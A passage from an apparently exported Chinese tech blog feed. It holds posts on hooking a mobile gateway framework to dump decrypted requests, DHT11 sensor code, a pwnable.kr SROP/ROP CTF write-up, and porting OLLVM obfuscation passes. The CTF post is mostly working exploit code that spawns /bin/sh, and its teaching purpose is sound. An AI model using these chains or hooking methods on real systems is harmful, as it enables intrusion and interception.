    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="TMF"><a href="#TMF" class="headerlink" title="TMF"></a>TMF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>网关服务+开发框架</p><p>客户端 ———HTTP/TCP———&gt;网关———HTTP/RPC———&gt; 服务器</p><p>客户端会将请求数据发送到网关，网关解析到数据后会根据该URL配置项中的HTTP/RPC将数据转发到对应的业务服务器;然后业务服务器处理完成后将数据返回给网关，网关再将数据返回给客户端。</p><h2 id="请求路径"><a href="#请求路径" class="headerlink" title="请求路径"></a>请求路径</h2><p>原生路径：<br>sharkinit-&gt;xxfunc-(sharkUtil)-&gt;sendshark<br>一般会对shark进行封装，例如LoginActivity-&gt;SharkUtil.request(“login.do”)-&gt;Shark.sendshark</p><p><img src="http://150.158.143.160:8877/2021/12/05/1ae2bb8d07769.png" alt="login|600"><br><img src="http://150.158.143.160:8877/2021/12/05/1d0db6d533fa2.png" alt="util|600"><br><img src="http://150.158.143.160:8877/2021/12/05/86e60ed75cc4d.png" alt="sendshark|600"></p><p>H5路径<br>xx.js（$rpcDo）→app.js-&gt;TMFJSBridge.js→ITMFWebView-&gt;BaseTMFWeb-&gt;findjsapi-&gt;xxjsapi-&gt;sendshark-&gt;oncallback</p><p>js请求通过TMFJSBridge调用webview中注册的js接口，webview初始化时会将已实现的JsApi接口类和接口名称关联（Map），所以js中通过接口名即可调用java层函数<br><img src="http://150.158.143.160:8877/2021/12/05/4a236b0aee1ef.png" alt="findjsapi|600"><br>实现JsApi接口<br><img src="http://150.158.143.160:8877/2021/12/05/1fc887e304fc2.png" alt="jsapi|600"><br><img src="http://150.158.143.160:8877/2021/12/05/4709990a60e16.png" alt="apiname|400"><br><img src="http://150.158.143.160:8877/2021/12/05/3754e4582a69a.png" alt="jsname|600"></p><h2 id="Shark"><a href="#Shark" class="headerlink" title="Shark"></a>Shark</h2><p>鲨鱼皮作为网关组件，其包含了数据格式处理、加解密、通讯</p><ul><li>初始化Shark</li><li>获取配置</li><li>Build</li><li>Start</li></ul><p> Shark初始化需要获取程序Context，一般为Application:<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shark.setAppContext(<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure></p><p>Shark需要从TMFconfig配置中获取应用ID、协议类型、网关等信息。<br>创建一个Shark实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Shark shark = SharkFactory.builder(context)</span><br><span class="line">    .logEnable(IS_LOG_ENABLE)</span><br><span class="line">.serverType(SERVER_TYPE)</span><br><span class="line">.sharkPkg(sharkPkg).instanceName(instanceName)</span><br><span class="line">.sharkOutlet(sharkOutlet)</span><br><span class="line">.serviceFactory(serviceFactory)</span><br><span class="line">.withTcpChannel(withTcpChannel)</span><br><span class="line">.build();</span><br></pre></td></tr></table></figure><p>最后启动shark:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shark.start(autoStartTcpChannel)</span><br></pre></td></tr></table></figure><p>关键函数：<br>serviceFactory<br>设置线程池和加解密算法，需要实现一个IServiceFactory接口，框架提供默认的SM2和SM4：<br><img src="http://150.158.143.160:8877/2021/12/05/969f66d6a84dd.png" alt="serviceFactory"></p><p> sendShark<br>两个参数SharkHttpEntity、 ISharkCallBack2<br>SharkHttpEntity：是封装的请求或响应结构，sendShark中对应参数为请求包对象<br>ISharkCallBack2：网络请求回调接口，接口需要实现onFinish，最后一个参数也为SharkHttpEntity，则是应答包对象<br><img src="http://150.158.143.160:8877/2021/12/05/474521ecba9b6.png" alt="sendshark"><br>SharkHttpEntity继承自JceStruct</p><p>SharkHttpEntity结构：</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>params</td><td>SashimiHeader对象，header参数集合</td></tr><tr><td>data</td><td>请求body</td></tr></tbody></table><p>编写请求参数的自吐脚步建议从SharkHttpEntity初始化处入手，shark的加解密接口由于参数已经是SharkHttpEntity结构的byte数组，不好处理。开发为了便利，一般会对SharkHttpEntity进行封装，封装类的入参往往都是String，参数格式一般为json或url格式，容易打印和处理。<br>应答参数的自吐脚步从ISharkCallBack2的回调函数onFinish中进行回溯，对已经将SharkHttpEntity.data处理成String处进行hook。</p><h2 id="通讯过程"><a href="#通讯过程" class="headerlink" title="通讯过程"></a>通讯过程</h2><p><img src="http://150.158.143.160:8877/2021/12/05/c5ce813a9025a.png" alt="network"></p><ol><li> 终端随机生成一个密钥randomKey;</li><li> 用服务器的SM2公钥对randomKey做非对称加密得到secret，并用randomKey 对业务数据做 SM4 对称加密，然后发送给后台;</li><li> 后台用对应的SM2私钥对secret解密得到randomKey，并为其分配一个标识 sessionId，存储 sessionId 和 randomKey 的映射关系;并用 randomKey 对业务数据做 SM4 对称解密，返回的业务数据也用 randomKey 做 SM4 加 密，将 sessionId 和业务数据一起返回给终端;</li><li> 终端收到响应后，后续每次请求都带上该sessionId，并用randomKey数据 进行 SM4 加密;</li><li> 后台收到请求后，根据sissionId找到randomKey，用randomKey对数据进 行 SM4 解密;</li><li> 回包数据也是用randomKey进行SM4加密。</li></ol><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><ol><li>加密算法<blockquote><p>64字节SM2、128位SM4，安全</p></blockquote></li><li>通讯安全<blockquote><p>密钥协商阶段，密钥传输使用非对称加密；数据传输过程中仅能获取到sessionid和密文，未携带任何密钥信息；sessionid具有时效性；</p></blockquote></li><li>完整性<blockquote><p>说是可以在网关到后台直接配置验签服务，客户端没有；</p></blockquote></li><li>抗抵赖<blockquote><p>不支持，需要自行添加数字签名。</p></blockquote></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Dth11温湿度传感器</title>
    <link href="https://f4ncy.top/2019/10/31/Dth11/"/>
    <id>https://f4ncy.top/2019/10/31/Dth11/</id>
    <published>2019-10-31T08:29:15.000Z</published>
    <updated>2019-10-31T08:58:12.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="Dth11温湿度传感器"><a href="#Dth11温湿度传感器" class="headerlink" title="Dth11温湿度传感器"></a>Dth11温湿度传感器</h1><p><strong>元件</strong>：该传感器包括一个电阻式感湿元件和一个NTC测温元件，并与一个高性能8位单片机相连接。</p><p><strong>引脚说明</strong>：</p><ol><li>VDD：供电3-5.5V</li><li>DATA：串行数据，单总线</li><li>NC：空脚，请悬空</li><li>GND：接地，电源负极</li></ol><p><strong>工作流程</strong>：</p><p>DATA用于微处理器与DHT11之间的通讯和同步,采用单总线数据格式,一次通讯时间4ms左右,数据分小数部分和整数部分,具体格式在下面说明,当前小数部分用于以后扩展,现读出为零。操作流程如下:<br>一次完整的数据传输为40bit,高位先出。<br>数据格式:<br>8bit湿度整数数据 + 8bit湿度小数数据 + 8bit温度整数数据 + 8bit温度小数数据 +8 bit校验和<br>数据传送正确时校验和数据等于“8bit湿度整数数据+8bit湿度小数数据+8bi温度整数数据+8bit温度小数数据”所得结果的末8位。<br><code>bits[0]+bits[1]+bits[2]+bits[3]=bits[4]</code></p><p>主机请求：总线拉低至少18ms，之后总线拉高延时等待20-40us，切换到输入模式；<br>DHT响应：接收到开始信号后，等待主机信号结束，然后发送80us低电平响应信号，之后把总线拉高80us准备发送数据，每一bit数据以50us低电平时隙开始，高电平的长短决定数据位为0或1，当最后一bit数据传送完毕后，DHT11拉低总线50us,随后总线由上拉电阻拉高进入空闲状态。</p><p><strong>代码说明</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">dht11::dec2f</span><span class="params">(<span class="keyword">uint8_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">float</span> result = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">result = ((<span class="keyword">float</span>)x) / <span class="number">10</span>;</span><br><span class="line">x /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dht11::read</span><span class="params">(<span class="keyword">int</span> pin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// BUFFER TO RECEIVE</span></span><br><span class="line"><span class="keyword">uint8_t</span> bits[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">uint8_t</span> cnt = <span class="number">7</span>;</span><br><span class="line"><span class="keyword">uint8_t</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">float</span> decpart = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">float</span> intpart = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EMPTY BUFFER</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">bits[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">pinMode</span>(pin, OUTPUT);<span class="comment">//输出模式</span></span><br><span class="line"><span class="built_in">digitalWrite</span>(pin, LOW);  <span class="comment">//拉低点位</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">18</span>); <span class="comment">//主机发送开始信号</span></span><br><span class="line"><span class="built_in">digitalWrite</span>(pin, HIGH); <span class="comment">//拉高点位</span></span><br><span class="line"><span class="built_in">delayMicroseconds</span>(<span class="number">40</span>);   <span class="comment">//延时等待</span></span><br><span class="line"><span class="built_in">pinMode</span>(pin, INPUT); <span class="comment">//切换为输入模式，接收信号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ACKNOWLEDGE or TIMEOUT</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> loopCnt = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">digitalRead</span>(pin) == LOW) <span class="comment">//接收DHT响应信号</span></span><br><span class="line"><span class="keyword">if</span> (loopCnt-- == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> DHTLIB_ERROR_TIMEOUT;</span><br><span class="line"></span><br><span class="line">loopCnt = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">digitalRead</span>(pin) == HIGH) <span class="comment">//DHT准备发送数据</span></span><br><span class="line"><span class="keyword">if</span> (loopCnt-- == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> DHTLIB_ERROR_TIMEOUT;</span><br><span class="line"></span><br><span class="line"><span class="comment">// READ OUTPUT - 40 BITS =&gt; 5 BYTES or TIMEOUT</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">loopCnt = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">digitalRead</span>(pin) == LOW)</span><br><span class="line"><span class="keyword">if</span> (loopCnt-- == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> DHTLIB_ERROR_TIMEOUT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> t = <span class="built_in">micros</span>();</span><br><span class="line"></span><br><span class="line">loopCnt = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">digitalRead</span>(pin) == HIGH)</span><br><span class="line"><span class="keyword">if</span> (loopCnt-- == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> DHTLIB_ERROR_TIMEOUT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">micros</span>() - t) &gt; <span class="number">40</span>)</span><br><span class="line">bits[idx] |= (<span class="number">1</span> &lt;&lt; cnt); <span class="comment">//高点位维持26us-28us代表‘0’，维持70us代表‘1’，这里以40us为界限判断</span></span><br><span class="line"><span class="keyword">if</span> (cnt == <span class="number">0</span>) <span class="comment">// 判断8bit是否结束</span></span><br><span class="line">&#123;</span><br><span class="line">cnt = <span class="number">7</span>; <span class="comment">// 重置准备下一8bit读取</span></span><br><span class="line">idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cnt--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">decpart = <span class="built_in">dec2f</span>(bits[<span class="number">1</span>]); <span class="comment">//第二个8bit，转换湿度float小数部分（湿度的小数确实无数据）</span></span><br><span class="line">tmp = bits[<span class="number">0</span>];</span><br><span class="line">intpart = (<span class="keyword">float</span>)(tmp); <span class="comment">//第一个8bit，转换湿度float整数部分</span></span><br><span class="line">humidity = intpart + decpart;</span><br><span class="line"></span><br><span class="line">decpart = <span class="built_in">dec2f</span>(bits[<span class="number">3</span>]); <span class="comment">//第四个8bit，转换温度float小数部分（测试温度的小数是有数据的）</span></span><br><span class="line">tmp = bits[<span class="number">2</span>];</span><br><span class="line">intpart = (<span class="keyword">float</span>)(tmp); <span class="comment">//第三个8bit，转换温度float整数部分</span></span><br><span class="line">temperature = intpart + decpart;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> sum = bits[<span class="number">0</span>] + bits[<span class="number">1</span>] + bits[<span class="number">2</span>] + bits[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bits[<span class="number">4</span>] != sum)</span><br><span class="line"><span class="keyword">return</span> DHTLIB_ERROR_CHECKSUM; <span class="comment">//校验和</span></span><br><span class="line"><span class="keyword">return</span> DHTLIB_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://f4ncy.top/2019/09/02/SROP/"/>
    <id>https://f4ncy.top/2019/09/02/SROP/</id>
    <published>2019-09-02T08:29:15.000Z</published>
    <updated>2019-09-02T08:31:41.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="pwnable-kr-unexploitable-SROP"><a href="#pwnable-kr-unexploitable-SROP" class="headerlink" title="pwnable.kr-unexploitable(SROP)"></a>pwnable.kr-unexploitable(SROP)</h1><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)</code></pre><p>一个栈溢出漏洞。</p><h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>利用syscall(59)代替执行execve<br>得到rax=59（利用read返回值）</p><ol><li>bss中写入跳入bss的rop</li><li>构造利用read读取59字节的rop</li><li>执行syscall</li></ol><p>填充main栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bss_base = <span class="number">0x0000000000601028</span> + <span class="number">0x200</span></span><br><span class="line">bash_addr = <span class="number">0x0000000000601028</span> + <span class="number">0x400</span></span><br><span class="line">syscall_addr = <span class="number">0x00400560</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x00400512</span></span><br><span class="line">leave_ret = <span class="number">0x00400576</span></span><br><span class="line">part1 = <span class="number">0x004005e6</span></span><br><span class="line">part2 = <span class="number">0x004005d0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_function</span>(<span class="params">call_addr, arg1, arg2, arg3</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += p64(part1)       <span class="comment"># =&gt; RSP first ret to part1</span></span><br><span class="line">    payload += <span class="string">&quot;A&quot;</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># =&gt; RBX</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># =&gt; RBP</span></span><br><span class="line">    payload += p64(call_addr)   <span class="comment"># =&gt; R12 =&gt; RIP</span></span><br><span class="line">    payload += p64(arg1)        <span class="comment"># =&gt; R13 =&gt; RDI</span></span><br><span class="line">    payload += p64(arg2)        <span class="comment"># =&gt; R14 =&gt; RSI</span></span><br><span class="line">    payload += p64(arg3)        <span class="comment"># =&gt; R16 =&gt; RDX</span></span><br><span class="line">    payload += p64(part2)       <span class="comment"># ret to part2 prepare to execute the call</span></span><br><span class="line">    payload += <span class="string">&quot;C&quot;</span> * <span class="number">0x38</span>       <span class="comment"># for add rsp,0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload1  = <span class="string">&quot;A&quot;</span> * <span class="number">0x10</span>              <span class="comment">#填充main的栈</span></span><br><span class="line">payload1 += p64(bss_base)           <span class="comment">#bss_base-&gt;rbp</span></span><br><span class="line">payload1 += call_function(elf.got[<span class="string">&quot;read&quot;</span>], <span class="number">0</span>, bss_base, <span class="number">0x200</span>)<span class="comment">#write rop to bss</span></span><br><span class="line">payload1 += p64(pop_rbp_ret)    <span class="comment">#ret to pop instruction make the rbp point to bss[+I1]</span></span><br><span class="line">payload1 += p64(bss_base)       <span class="comment">#pop value[-I1]</span></span><br><span class="line">payload1 += p64(leave_ret)      <span class="comment">#ret to leave instruction[+I2]</span></span><br><span class="line">payload2  = p64(bss_base+<span class="number">0x8</span>)   <span class="comment">#the value pop to rbp[-I2]</span></span><br><span class="line">payload2 += call_function(elf.got[<span class="string">&quot;read&quot;</span>], <span class="number">0</span>, bash_addr, <span class="number">0x200</span>)<span class="comment">#write payload to bash_addr and make the value of rax is the return-value of read[-I2]</span></span><br><span class="line">payload2 += call_function(bash_addr+<span class="number">0x10</span>, bash_addr, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload3 = <span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>, <span class="string">&quot;B&quot;</span>) </span><br><span class="line">payload3 += p64(syscall_addr)   <span class="comment">#the address of instruction to call</span></span><br><span class="line">payload3 = payload3.ljust(<span class="number">59</span>, <span class="string">&quot;D&quot;</span>)</span><br></pre></td></tr></table></figure><p>rop流程：<br>第一次read：将read调用rop和跳转到bss段执行所需的rop写入栈<br>第二次read：将调用read的rop和调用syscall的rop写入bss<br>第三次read：将”/bin/sh”写入bash_addr，将syscall地址设置为返回地址，并将payload填充至59字节，使得read调用返回值为59触发execve。</p><h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）</p><p><img src="/2019/09/02/SROP/15673894987140.jpg"></p><p>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例：</p><p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code>：</p><p><img src="/2019/09/02/SROP/15673912142638.jpg"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>之前通过ROP的方式实现利用，但是需要构造的gadgets很多，流程也十分繁琐，而利用SROP利用流程就变得简洁许多。<br>同样利用read将调用read的rop和跳转到bss段执行所需的rop写入栈，利用第二次调用read将sig_frame和”/bin/sh”写入bss，并且构造第三次调用read的rop，第三次调用read是为了将rax设置为15，使syscall触发__NR_rt_sigreturn，sigreturn被设置为syscall，rdi为”/bin/sh”地址，rax为59，成功执行execve(“/bin/sh”)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_function</span>(<span class="params">call_addr, arg1, arg2, arg3</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += p64(part1)       <span class="comment"># =&gt; RSP</span></span><br><span class="line">    payload += <span class="string">&quot;A&quot;</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># =&gt; RBX</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># =&gt; RBP</span></span><br><span class="line">    payload += p64(call_addr)   <span class="comment"># =&gt; R12 =&gt; RIP</span></span><br><span class="line">    payload += p64(arg1)        <span class="comment"># =&gt; R13 =&gt; RDI</span></span><br><span class="line">    payload += p64(arg2)        <span class="comment"># =&gt; R14 =&gt; RSI</span></span><br><span class="line">    payload += p64(arg3)        <span class="comment"># =&gt; R16 =&gt; RDX</span></span><br><span class="line">    payload += p64(part2)</span><br><span class="line">    payload += <span class="string">&quot;C&quot;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">sig_frame = SigreturnFrame()              <span class="comment">#设置SROP Frame</span></span><br><span class="line">sig_frame.rax = <span class="number">59</span></span><br><span class="line">sig_frame.rdi = bss_base+<span class="number">0x200</span></span><br><span class="line">sig_frame.rsi = <span class="number">0</span></span><br><span class="line">sig_frame.rdx = <span class="number">0</span></span><br><span class="line">sig_frame.rip = syscall_addr</span><br><span class="line">payload1  = <span class="string">&quot;A&quot;</span> * <span class="number">0x10</span></span><br><span class="line">payload1 += p64(bss_base)</span><br><span class="line">payload1 += call_function(elf.got[<span class="string">&quot;read&quot;</span>], <span class="number">0</span>, bss_base, <span class="number">0x300</span>)</span><br><span class="line">payload1 += p64(pop_rbp_ret)</span><br><span class="line">payload1 += p64(bss_base)</span><br><span class="line">payload1 += p64(leave_ret)</span><br><span class="line">payload2  = p64(bss_base+<span class="number">0x8</span>)</span><br><span class="line">payload2 += call_function(elf.got[<span class="string">&quot;read&quot;</span>], <span class="number">0</span>, sig_stage, <span class="number">0x100</span>)</span><br><span class="line">payload2 += sig_frame</span><br><span class="line">payload2  = payload2.ljust(<span class="number">0x200</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload2 += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload3  = <span class="string">&quot;D&quot;</span> * <span class="number">0xf</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>移植OLLVM混淆pass</title>
    <link href="https://f4ncy.top/2019/03/22/rebuildpass/"/>
    <id>https://f4ncy.top/2019/03/22/rebuildpass/</id>
    <published>2019-03-21T16:00:00.000Z</published>
    <updated>2019-03-24T08:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="移植OLLVM混淆pass"><a href="#移植OLLVM混淆pass" class="headerlink" title="移植OLLVM混淆pass"></a>移植OLLVM混淆pass</h1><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>仅仅是学习混淆pass的编写，改动不是很大。将OLLVM的pass放进新版本（7.0.0 release）的LLVM源码下进行编译。<br>OLLVM的pass目录：<code>OLLVM/lib/Transforms/Obfuscation</code></p><p>控制流平坦化：Flattening.cpp<br>虚假控制流：BogusControlFlow.cpp SplitBasicBlocks.cpp<br>指令替换：Substitution.cpp</p><p>对应头文件目录：<code>OLLVM/include/llvm/Transforms/Obfuscation</code></p><p>这里以分割基本块的pass为例，将<br>SplitBasicBlocks.cpp SplitBasicBlocks.h<br>Utils.cpp Utils.h<br>CryptoUtils.h(include/llvm/)<br>复制到对应目录。</p><p>修改对应目录下的LLVMBuild.txt，subdirectories添加模块目录名称。修改对应目录下（Obfuscation目录下和Transforms目录下）的CMakeLists.txt，add_llvm_library添加模块名称和参与编译文件，add_dependencies添加模块名称。此时进行编译就可以看到build/lib目录下已经有libLLVMObfus.a（我把OLLVM里的Obfuscation改成了Obfus）。<br>但是此时运行opt，发现无<code>-split</code>参数。</p><p>所以我们还需要修改IPO（Transforms/IPO），加入PassManager之后可以直接通过clang的参数使用pass了<br>PassManagerBuilder.cpp：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">45</span>      <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/Obfus/Split.h&quot;</span></span></span><br><span class="line">+<span class="number">158</span>     <span class="function"><span class="keyword">static</span> cl::opt&lt;<span class="keyword">bool</span>&gt; <span class="title">Split</span><span class="params">(<span 